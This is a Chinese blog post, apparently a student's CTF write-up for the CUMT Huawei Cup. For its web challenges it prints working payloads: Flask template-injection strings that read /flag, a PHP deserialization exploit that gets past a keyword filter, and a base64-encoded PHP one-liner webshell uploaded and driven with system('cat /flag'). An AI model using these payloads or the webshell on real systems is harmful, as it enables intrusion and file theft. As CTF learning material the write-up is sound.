@@ -1,0 +1,723 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
+  <link rel="icon" type="image/png" href="/img/feiji.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sunzy">
+  <meta name="keywords" content="">
+  <title>cumt华为杯 - 一路走到黑</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-28 20:26" pubdate>
+        2020年10月28日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      801 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      11
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">cumt华为杯</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="cumt-华为杯"><a href="#cumt-华为杯" class="headerlink" title="cumt_华为杯"></a>cumt_华为杯</h1><p>经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>真签到题，抽个奖就给出了flag</p>
+<h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
+<p>就是了模板注入</p>
+<div class="hljs"><pre><code class="hljs handlebars"><span class="xml">url+</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="xml">Copy</span></code></pre></div>
+
+<p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
+<div class="hljs"><pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
+查看模块时，发现存在waf
+经过测试发现是过滤了[]
+于是使用
+&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
+存在file模块
+用read读取文件内容
+<span class="hljs-built_in">exp</span>:
+<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/flag&#x27;</span>).read()Copy</code></pre></div>
+
+<p>参考链接：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p>
+<h3 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h3><p>这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。</p>
+<p><a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png"><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" srcset="/img/loading.gif" alt="cms.png"></a></p>
+<p>这里给出大神的做法</p>
+<p><a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png"><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" srcset="/img/loading.gif" alt="cms1.png"></a></p>
+<h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。</p>
+<p>看到WP是大S绕过，涨知识了</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">&#x27;license.txt&#x27;</span>, <span class="hljs-literal">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-literal">true</span>);
+    &#125;
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;
+    <span class="hljs-comment">//echo $str;</span>
+    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$matches</span>)) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+&#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;
+    <span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Source();
+    <span class="hljs-variable">$s</span>-&gt;source = <span class="hljs-keyword">__FILE__</span>;
+
+    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;
+    <span class="hljs-keyword">exit</span>;
+&#125;
+<span class="hljs-variable">$todos</span> = [];
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>]))&#123;
+    <span class="hljs-keyword">if</span>(!easy_check(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>])) &#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!\n&quot;</span>;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>];
+        <span class="hljs-variable">$h</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
+        <span class="hljs-variable">$m</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">32</span>);
+        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$m</span>) === <span class="hljs-variable">$h</span>)&#123;
+            <span class="hljs-variable">$todos</span> = unserialize(<span class="hljs-variable">$m</span>);
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>]))&#123;
+    <span class="hljs-variable">$todo</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>];
+
+    <span class="hljs-variable">$todos</span>[] = <span class="hljs-variable">$todo</span>;
+    <span class="hljs-variable">$m</span> = serialize(<span class="hljs-variable">$todos</span>);
+    <span class="hljs-variable">$h</span> = md5(<span class="hljs-variable">$m</span>);
+
+    setcookie(<span class="hljs-string">&#x27;todos&#x27;</span>, <span class="hljs-variable">$h</span>.<span class="hljs-variable">$m</span>);
+    header(<span class="hljs-string">&#x27;Location: &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);
+    <span class="hljs-keyword">exit</span>;
+&#125;
+<span class="hljs-comment">// flag is in flag.php</span>
+?Copy</code></pre></div>
+
+<p>exp</p>
+<div class="hljs"><pre><code class="hljs rust">echo md5(<span class="hljs-symbol">&#x27;a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:
+&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);
+echo urlencode(<span class="hljs-symbol">&#x27;ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:
+&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);<span class="hljs-built_in">Copy</span></code></pre></div>
+
+<p><a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" srcset="/img/loading.gif" alt="hodor.png"></a></p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SmileAndFun/article/details/108497183">https://blog.csdn.net/SmileAndFun/article/details/108497183</a></p>
+<h3 id="webcms"><a href="#webcms" class="headerlink" title="webcms"></a>webcms</h3><p>是一个博客管理的网站，其实也是个原题，考察点是文件上传</p>
+<p>漏洞点在图片中上传图片的位置</p>
+<p><a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png"><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" srcset="/img/loading.gif" alt="webcms.png"></a></p>
+<p>随便上传一张图片试试，抓包结果如下，几个注意点</p>
+<p><a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png"><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" srcset="/img/loading.gif" alt="webcms2.png"></a></p>
+<blockquote>
+<p>1.filetype规定了文件的类型</p>
+<p>2.上传时，将图片保存为了base64形式</p>
+<p>所以上传一句话木马的时候要注意修改对应的位置</p>
+</blockquote>
+<p>一句话木马类型为php,则filetype改为php</p>
+<p>内容为密码为cmd一句话木马，对应的base64编码<code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>
+<p><a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png"><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" srcset="/img/loading.gif" alt="webcms3.png"></a></p>
+<p>上传成功，访问保存的路径：<code>http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php</code></p>
+<div class="hljs"><pre><code class="hljs css">POST:
+cmd=<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);
+或者蚁剑连接，密码cmdCopy</code></pre></div>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MIsc部分基本都是队友做的，好像也不是太难</p>
+<h3 id="伪web"><a href="#伪web" class="headerlink" title="伪web"></a>伪web</h3><p>真是伪web。。。</p>
+<p>直接在文件里搜索就能到flag</p>
+<p>搜索关键词cmut，flag所在文件夹为html\include\include.php</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/unserialize/">unserialize</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ssti/">ssti</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/11/01/preg/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">正则表达式</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/08/buuoj-LFI/">
+                        <span class="hidden-mobile">buuctf-LFI</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    function loadValine() {
+      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
+          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
+          placeholder: "说点什么吧~~~",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: true,
+          recordIP: false,
+          serverURLs: "",
+          master: "4cd096660a71d786a2a4d9d0bb4e8996",
+          friends: "b275f0fc8103331da645a878cf60f841",
+          tagMeta: ["博主","友人","访客"],
+        });
+      });
+    }
+    waitElementVisible('vcomments', loadValine);
+  </script>
+  <noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments
+      powered by Valine.</a></noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+  <div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container custom post-content mx-auto">
+      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
+    </div>
+  </div>
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "cumt华为杯&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: true,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2020</span></a>
+    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
+     <span>my blog</span></a>    <br>
+  </div>
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
